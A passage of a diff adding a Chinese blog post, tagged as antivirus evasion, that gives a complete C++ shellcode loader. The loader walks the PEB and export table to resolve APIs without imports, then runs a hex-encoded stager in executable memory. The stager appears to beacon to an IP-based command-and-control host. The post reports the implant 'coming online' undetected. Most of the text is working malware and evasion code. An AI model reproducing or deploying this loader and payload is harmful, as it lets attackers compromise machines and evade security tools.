+	PLIST_ENTRY wei = ModuleList->Blink;
+	while (tou != wei) {
+		PLDR_DATA_TABLE_ENTRY Flink1 = (PLDR_DATA_TABLE_ENTRY)tou;
+		ULONG dllBase = (ULONG)Flink1->DllBase;
+		PWSTR dllName = Flink1->BaseDllName.Buffer;
+		if (wcscmp(dllName, L"KERNEL32.DLL") == 0) {
+			return dllBase;
+		}
+		tou = tou->Flink;
+	}
+
+	return -1;
+}
+
+ULONG getFunAddress() {
+	ULONG KERNEL32 = getDllName();
+	PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)KERNEL32; // 获取KERNEL32.DLL的DOS头
+	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(KERNEL32 + pDOS->e_lfanew); // 获取KERNEL32.DLL的NT头
+	PIMAGE_OPTIONAL_HEADER pOPTIONAL = (PIMAGE_OPTIONAL_HEADER)(&pNT->OptionalHeader); // 获取KERNEL32.DLL的可选映像头
+	PIMAGE_DATA_DIRECTORY pDATA = (PIMAGE_DATA_DIRECTORY)pOPTIONAL->DataDirectory; // 获取KERNEL32.DLL的数据目录表
+	PIMAGE_DATA_DIRECTORY pEXPORT_TABLE = &pDATA[0]; // 获取KERNEL32.DLL的导出表地址
+	DWORD offset = pEXPORT_TABLE->VirtualAddress; // 获取偏移地址
+
+	PIMAGE_EXPORT_DIRECTORY pEXPORT_TABLE_INFO = (PIMAGE_EXPORT_DIRECTORY)(KERNEL32 + offset);
+	DWORD funCount = pEXPORT_TABLE_INFO->NumberOfFunctions; // 获取导出表中的函数数量
+	PDWORD  pEXPORT_ADDRESS_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfFunctions); //获取导出地址表
+	PDWORD  pEXPORT_NAME_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNames); //获取导出名称表
+	PWORD pEXPORT_XH_TABLE = (PWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNameOrdinals); //获取导出序号表
+
+
+	for (DWORD i = 0; i < funCount; i++) {
+		if (!pEXPORT_ADDRESS_TABLE[i]) {
+			continue;
+		}
+		DWORD XH = pEXPORT_TABLE_INFO->Base + i; //获取函数序号
+		DWORD funAddrOffset = pEXPORT_ADDRESS_TABLE[i]; // 获取函数偏移地址
+
+		for (DWORD j = 0; j < funCount; j++) {
+			if (pEXPORT_XH_TABLE[j] == i) {
+				ULONG funNameOffset = pEXPORT_NAME_TABLE[j];
+				char* funName = (char*)(KERNEL32 + funNameOffset);
+				if (strcmp(funName, "GetProcAddress") == 0) {
+					printf("%s          0x%x\n", funName, (KERNEL32 + funAddrOffset));
+					return KERNEL32 + funAddrOffset;
+				}
+			}
+		}
+	}
+}
+
+
+int main() {
+	getFunAddress();
+	return 0;
+}
+```
+
+## 4、完整代码
+### I、头文件 source.h
+```C++
+#pragma once
+#include <Windows.h>
+#include <cstdio>
+
+
+typedef NTSTATUS(WINAPI* MyRtlAdjustPrivilege)(
+	ULONG    Privilege,
+	BOOLEAN  Enable,
+	BOOLEAN  CurrentThread,
+	PBOOLEAN Enabled
+	);
+
+typedef HRSRC(WINAPI* MyFindResource)(
+	HMODULE hModule,   // 包含资源的模块的句柄
+	LPCWSTR lpName,    // 资源的名称
+	LPCWSTR lpType     // 资源的类型
+	);
+
+typedef DWORD(WINAPI* MySizeofResource)(
+	HMODULE hModule,
+	HRSRC hResInfo
+	);
+
+typedef HGLOBAL(WINAPI* MyLoadResource)(
+	HMODULE hModule,
+	HRSRC hResInfo
+	);
+
+typedef LPVOID(WINAPI* MyVirtualAlloc)(
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD  flAllocationType,
+	DWORD  flProtect
+	);
+
+typedef BOOL(WINAPI* MyVirtualFree)(
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD  dwFreeType
+	);
+
+typedef HANDLE(WINAPI* MyCreateThread)(
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	SIZE_T dwStackSize,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID lpParameter,
+	DWORD dwCreationFlags,
+	LPDWORD lpThreadId
+	);
+
+typedef DWORD(WINAPI* MyWaitForSingleObject)(
+	HANDLE hHandle,
+	DWORD dwMilliseconds
+	);
+
+typedef HMODULE(WINAPI* MyLoadLibraryA)(
+	LPCSTR lpFileName  // DLL 文件的路径或名称
+	);
+
+typedef HMODULE(WINAPI* MyGetModuleHandleA)(
+	LPCSTR lpFileName  // DLL 文件的路径或名称
+	);
+
+typedef int(WINAPI* MyMessageBoxA)(
+	HWND    hWnd,
+	LPCSTR lpText,
+	LPCSTR lpCaption,
+	UINT    uType
+	);
+
+typedef ULONG(WINAPI* MyGetProcAddress)(
+	HMODULE hModule,    // 包含导出函数的 DLL 模块的句柄
+	LPCSTR  lpProcName  // 要获取的函数的名称
+	);
+
+
+
+
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR Buffer;
+}UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY {
+	PVOID Reserved1[2];
+	LIST_ENTRY InMemoryOrderLinks;
+	PVOID Reserved2[2];
+	PVOID DllBase;
+	PVOID EntryPoint;
+	PVOID Reserved3;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+	BYTE Reserved4[8];
+	PVOID Reserved5[3];
+	union {
+		ULONG CheckSum;
+		PVOID Reserved6;
+	};
+	ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
+
+ULONG getKERNEL32() {
+	ULONG address;
+	__asm {
+		mov eax, fs: [0x030] // 进入PEB
+		mov eax, [eax + 0x00c] // 进入Ldr
+		mov eax, [eax + 0x00c] // 进入第一个InLoadOrderModuleList
+		mov address, eax
+	}
+	PLDR_DATA_TABLE_ENTRY Flink = (PLDR_DATA_TABLE_ENTRY)address;
+
+	PLIST_ENTRY ModuleList = (PLIST_ENTRY)Flink;
+	PLIST_ENTRY tou = ModuleList->Flink;
+	PLIST_ENTRY wei = ModuleList->Blink;
+	while (tou != wei) {
+		PLDR_DATA_TABLE_ENTRY Flink1 = (PLDR_DATA_TABLE_ENTRY)tou;
+		ULONG dllBase = (ULONG)Flink1->DllBase;
+		PWSTR dllName = Flink1->BaseDllName.Buffer;
+		if (wcscmp(dllName, L"KERNEL32.DLL") == 0) {
+			return dllBase;
+		}
+		tou = tou->Flink;
+	}
+
+	return -1;
+}
+
+ULONG getFunAddr() {
+	ULONG KERNEL32 = getKERNEL32();
+	PIMAGE_DOS_HEADER pDOS = (PIMAGE_DOS_HEADER)KERNEL32; // 获取KERNEL32.DLL的DOS头
+	PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)(KERNEL32 + pDOS->e_lfanew); // 获取KERNEL32.DLL的NT头
+	PIMAGE_OPTIONAL_HEADER pOPTIONAL = (PIMAGE_OPTIONAL_HEADER)(&pNT->OptionalHeader); // 获取KERNEL32.DLL的可选映像头
+	PIMAGE_DATA_DIRECTORY pDATA = (PIMAGE_DATA_DIRECTORY)pOPTIONAL->DataDirectory; // 获取KERNEL32.DLL的数据目录表
+	PIMAGE_DATA_DIRECTORY pEXPORT_TABLE = &pDATA[0]; // 获取KERNEL32.DLL的导出表地址
+	DWORD offset = pEXPORT_TABLE->VirtualAddress; // 获取偏移地址
+
+	PIMAGE_EXPORT_DIRECTORY pEXPORT_TABLE_INFO = (PIMAGE_EXPORT_DIRECTORY)(KERNEL32 + offset);
+	DWORD funCount = pEXPORT_TABLE_INFO->NumberOfFunctions; // 获取导出表中的函数数量
+	PDWORD  pEXPORT_ADDRESS_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfFunctions); //获取导出地址表
+	PDWORD  pEXPORT_NAME_TABLE = (PDWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNames); //获取导出名称表
+	PWORD pEXPORT_XH_TABLE = (PWORD)(KERNEL32 + pEXPORT_TABLE_INFO->AddressOfNameOrdinals); //获取导出序号表
+
+
+	for (DWORD i = 0; i < funCount; i++) {
+		if (!pEXPORT_ADDRESS_TABLE[i]) {
+			continue;
+		}
+		DWORD XH = pEXPORT_TABLE_INFO->Base + i; //获取函数序号
+		DWORD funAddrOffset = pEXPORT_ADDRESS_TABLE[i]; // 获取函数偏移地址
+
+		for (DWORD j = 0; j < funCount; j++) {
+			if (pEXPORT_XH_TABLE[j] == i) {
+				ULONG funNameOffset = pEXPORT_NAME_TABLE[j];
+				char* funName = (char*)(KERNEL32 + funNameOffset);
+				if (strcmp(funName, "GetProcAddress") == 0) {
+					//printf("%s          0x%x\n", funName, (KERNEL32 + funAddrOffset));
+					ULONG FunBase = KERNEL32 + funAddrOffset;
+					return FunBase;
+				}
+			}
+		}
+	}
+	return 0;
+}
+```
+### II、调用代码
+```C++
+#include <cstdlib>
+#include <Windows.h>
+#include <stdio.h>
+#include <iostream>
+#include "source.h"
+#include "resource.h"
+#include <vector>
+#include <string>
+
+
+
+void test() {
+	HMODULE KERNEL32 = (HMODULE)getKERNEL32();
+	MyGetProcAddress pMyGetProcAddress = (MyGetProcAddress)getFunAddr();
+	MyLoadLibraryA pMyLoadLibrary = (MyLoadLibraryA)pMyGetProcAddress(KERNEL32, "LoadLibraryA");
+
+	HMODULE USER32 = (HMODULE)pMyLoadLibrary("user32.dll");
+	MyMessageBoxA pMessageBox = (MyMessageBoxA)pMyGetProcAddress(USER32, "MessageBoxA");
+	pMessageBox(NULL, "SUCCESS!", "FROM LANZ", MB_ICONINFORMATION | MB_OK);
+}
+
+
+void runn() {
+	HMODULE KERNEL32 = (HMODULE)getKERNEL32();
+	MyGetProcAddress pMyGetProcAddress = (MyGetProcAddress)getFunAddr();
+	MyVirtualAlloc pMyVirtualAlloc = (MyVirtualAlloc)pMyGetProcAddress(KERNEL32, "VirtualAlloc");
+	MyVirtualFree pMyVirtualFree = (MyVirtualFree)pMyGetProcAddress(KERNEL32, "VirtualFree");
+	MyCreateThread pMyCreateThread = (MyCreateThread)pMyGetProcAddress(KERNEL32, "CreateThread");
+	MyWaitForSingleObject pMyWaitForSingleObject = (MyWaitForSingleObject)pMyGetProcAddress(KERNEL32, "WaitForSingleObject");
+
+	char nox_shellcode[] = "fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d686e6574006877696e6954684c772607ffd531ff5757575757683a5679a7ffd5e9840000005b31c951516a03515168525b000053506857899fc6ffd5eb705b31d252680002408452525253525068eb552e3bffd589c683c35031ff57576aff5356682d06187bffd585c00f84c301000031ff85f6740489f9eb0968aac5e25dffd589c16845215e31ffd531ff576a0751565068b757e00bffd5bf002f000039c774b731ffe991010000e9c9010000e88bffffff2f6a71756572792d332e332e312e736c696d2e6d696e2e6a7300fc02f2b21bb91f569a79261e89f6aa6d30335ca68153ec96d769bbc3a2825e891f7a38a831a42977456e6281ee503f86b14bed70d6004163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a526566657265723a20687474703a2f2f636f64652e6a71756572792e636f6d2f0d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e5420362e333b2054726964656e742f372e303b2072763a31312e3029206c696b65204765636b6f0d0a00f2acb17007540dfd1504d1f8a7fd67391345854bacd9149ccf35eb37a590993ae6f80f70663c6dec2eea276c69d4ef9786b27be52cf37d0068f0b5a256ffd56a4068001000006800004000576858a453e5ffd593b9af0f000001d9515389e7576800200000535668129689e2ffd585c074c68b0701c385c075e558c3e8a9fdffff3131372e36382e3130312e33300005f5e100";
+	std::vector<char> shellcode;  // 初始化为全零，用于存储转义序列形式
+
+	// 将每两个字符转换为对应的 ASCII 字符
+	for (size_t i = 0; i < strlen(nox_shellcode); i += 2) {
+		std::string hex = std::string(nox_shellcode + i, 2); //每次取两个字符，即1个16位进制数
+		int num = std::stoi(hex, nullptr, 16); //将16位进制数转化为10进制整数
+		char ch = static_cast<char>(num); //将10进制整数转化为对应的字符
+		shellcode.push_back(ch); //将字符添加到mem数组中
+	}
+
+	LPVOID mem = pMyVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(mem, shellcode.data(), shellcode.size());
+	HANDLE hThread = pMyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+	pMyWaitForSingleObject(hThread, -1);
+
+	pMyVirtualFree(mem, 0, MEM_RELEASE);
+
+}
+
+int main() {
+	runn();
+	return 0;
+}
+
+```
+
+正常上线
+
+![](https://s3.hedgedoc.org/demo/uploads/854803b5-ed33-4757-97a4-01cbc61acc8c.png)
+
+没有任何的关键字
+
+![](https://s3.hedgedoc.org/demo/uploads/56f0fc20-c6d2-4989-abf5-92bb7b1dc24d.png)
+
+## 5、学习
+https://mdnice.com/writing/4d0ae898afe64ad2b7d68af175971729
+https://cloud.tencent.com/developer/article/2337995
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>免杀</tag>
+      </tags>
+  </entry>
 </search>
